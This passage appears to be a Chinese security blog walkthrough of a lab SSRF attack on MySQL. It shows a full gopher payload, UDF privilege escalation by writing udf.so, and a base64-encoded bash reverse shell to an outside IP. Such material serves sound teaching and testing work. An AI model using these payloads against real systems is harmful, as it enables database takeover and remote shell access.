运行效果如下：

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOcUicD79mILUuEOhn1qW6TN0V7peib8sbqGLwBHjcnUPvBjboXJWB34yKmNNO2Gd3RicXgjTVhpg3rpg/640?wx_fmt=png)

  

**SSRF 之 查询数据库**

本地 curl 请求这个 gopher 协议的数据包看看：

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOcUicD79mILUuEOhn1qW6TN0Eau4upvlvUEMT5Sib6XZaQvbQG65WNvUobMQykcovoNUspBbL4aTM8A/640?wx_fmt=png)

  

从图上可以看到 gopher 请求的数据包已经成功执行了，user() 和 数据库中的 flag 都可查询出来了。

如果 curl 请求提示是一个二进制文件无法直接显示，所可以使用 `--output` 来输出到文件中，然后手动 cat 文件同样也可以看到 gopher 协议交互 MySQL 的执行结果：

```
$ curl gopher://127.0.0.1:3306/_xxx --output mysql_result
```

  

**SSRF 之 MySQL 提权**

SSRF 攻击 MySQL 仅仅查询数据意义不大，不如直接 UDF 提权然后反弹 shell 出来更加直接，下面尝试使用 SSRF 来 UDF 提权内网的 MySQL 应用，关于 MySQL 更详细的文章可以参考我之前 MySQL 漏洞利用与提权。

https://www.sqlsec.com/2020/11/mysql.html

首先来寻找 MySQL 的插件目录，原生的 MySQL 命令如下：

```
$ mysql -h127.0.0.1 -uroot -e "show variables like '%plugin%';"
```

  

tcpdump 监听，使用 Wirshark 分析导出原始数据：

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOcUicD79mILUuEOhn1qW6TN033TMZxLAyEu9CMqN6FdnjsMfYQXt3MHGvmTBVoIPKvFuMmZiaAxm8jA/640?wx_fmt=png)

  

使用脚本将原始数据转换 gopher 协议，得到的数据如下：

```
curl gopher://127.0.0.1:3306/_%a2%00%00%01%85%a2%3f%00%00%00%00%01%08%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%65%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%04%33%35%35%34%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%36%2e%35%31%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%21%00%00%00%03%73%65%6c%65%63%74%20%40%40%76%65%72%73%69%6f%6e%5f%63%6f%6d%6d%65%6e%74%20%6c%69%6d%69%74%20%31%20%00%00%00%03%73%68%6f%77%20%76%61%72%69%61%62%6c%65%73%20%6c%69%6b%65%20%0a%27%25%70%6c%75%67%69%6e%25%27%01%00%00%00%01
```

  

放入到 BP 中请求的话记得需要二次 URL 编码，可以直接获取到插件的目录信息 :

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOcUicD79mILUuEOhn1qW6TN0sPFLCftJ0ps5TE1fy06RlfDia1Fed4J8PWckaPnFH9j0XBDJe5In8fQ/640?wx_fmt=png)

  

拿到 MySQL 的插件目录为：`/usr/lib/mysql/plugin/`

  

接着来写入动态链接库，原生的 MySQL 命令如下：

```
# 因为 payload 太长 这里就先进入 MySQL 控制台
$ mysql -h127.0.0.1 -uroot

MariaDB [(none)]> SELECT 0x7f454c460...省略大量payload...0000000 INTO DUMPFILE '/usr/lib/mysql/plugin/udf.so';
```

> 关于 UDF 提权的 UDF 命令可以参考国光写的这个 UDF 提权辅助页面：https://www.sqlsec.com/tools/udf.html

tcpdump 监听到的原始数据后，转换 gopher 协议，SSRF 攻击写入动态链接库，因为这个 gopher 协议的数据包非常长，BP 这边可能会出现 Waiting 卡顿的状态：

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOcUicD79mILUuEOhn1qW6TN09TY9gx3nl84ASRStObMG01RkibWuu64x3vACMicnWEtc5HjdauzFoEEQ/640?wx_fmt=png)

  

不过问题不大，实际上 udf.so 已经成功写入到 MySQL 的插件目录下了：

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOcUicD79mILUuEOhn1qW6TN0LxYMNhuISvXYKUsVzdV9oWWmCEFLR1qtAu1F3G82s50cCMW8ddwx9w/640?wx_fmt=png)

  

以此类推，创建自定义函数：

```
$ mysql -h127.0.0.1 -uroot -e "CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.so';"
```

  

最后通过创建的自定义函数并执行系统命令将 shell 弹出来，原生命令如下：

```
$ mysql -h127.0.0.1 -uroot -e "select sys_eval('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4yMTEuNTUuMi8yMzMzIDA+JjE=|base64 -d|bash -i')"
```

  

因为国光测试默认情况下弹不出来，所以这里将原始的 bash 反弹 shell 命令给编码了：

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOcUicD79mILUuEOhn1qW6TN0n71e3Hzckicc6T1tibIKzqz2CfWPsDjFCd7A9q4RlmGNePcBciaKXj5FQ/640?wx_fmt=png)

  

这个编码实际上就是 JS Base64 一下，国光我模仿国外的那个网站，自己写了个页面：https://www.sqlsec.com/tools.html

tcpdump 监听到的原始数据后，转换 gopher 协议，BP 二次编码请求一下，然后 SSRF 攻击成功弹出 shell：

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOcUicD79mILUuEOhn1qW6TN0AC1g2MnYFH1XER1DK6Uic9oyqPucICsZCLGrJ5ma6JoicXqTJYCtudaw/640?wx_fmt=png)

**靶场源码**

另外附上了本次靶场的源码，有动手能力朋友的可以自行搭建，https://github.com/sqlsec/ssrf-vuls

**参考资料**

https://github.com/tarunkant/Gopherus  

https://xz.aliyun.com/t/Github%EF%BC%9ALS95/gopher-redis-auth

  

关注公众号回复 “9527” 可免费获取一套 HTB 靶场文档和视频，“1120” 安全参考等安全杂志 PDF 电子版，“1208” 个人常用高效爆破字典，“0221”2020 年酒仙桥文章打包，还在等什么？赶紧点击下方名片关注学习吧！

公众号

* * *

**推 荐 阅 读**

  

  

  

[![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOf1BEGicRSpVMRDuaANDvrLcAcRDPBsTMEQ0pGhzmYrBp7pvhtHnb0sJiaBzhHIILwpLtxYnPjqKmibA/640?wx_fmt=png)](http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247487086&idx=1&sn=37fa19dd8ddad930c0d60c84e63f7892&chksm=cfa6aa7df8d1236bb49410e03a1678d69d43014893a597a6690a9a97af6eb06c93e860aa6836&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOf1BEGicRSpVMRDuaANDvrLcIJDWu9lMmvjKulJ1TxiavKVzyum8jfLVjSYI21rq57uueQafg0LSTCA/640?wx_fmt=png)](http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247486961&idx=1&sn=d02db4cfe2bdf3027415c76d17375f50&chksm=cfa6a9e2f8d120f4c9e4d8f1a7cd50a1121253cb28cc3222595e268bd869effcbb09658221ec&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOf8eyzKWPF5pVok5vsp74xolhlyLt6UPab7jQddW6ywSs7ibSeMAiae8TXWjHyej0rmzO5iaZCYicSgxg/640?wx_fmt=png)](http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247486327&idx=1&sn=71fc57dc96c7e3b1806993ad0a12794a&chksm=cfa6af64f8d1267259efd56edab4ad3cd43331ec53d3e029311bae1da987b2319a3cb9c0970e&scene=21#wechat_redirect)

**欢 迎 私 下 骚 扰**

  

  

![](https://mmbiz.qpic.cn/mmbiz_jpg/XOPdGZ2MYOdSMdwH23ehXbQrbUlOvt6Y0G8fqI9wh7f3J29AHLwmxjIicpxcjiaF2icmzsFu0QYcteUg93sgeWGpA/640?wx_fmt=jpeg)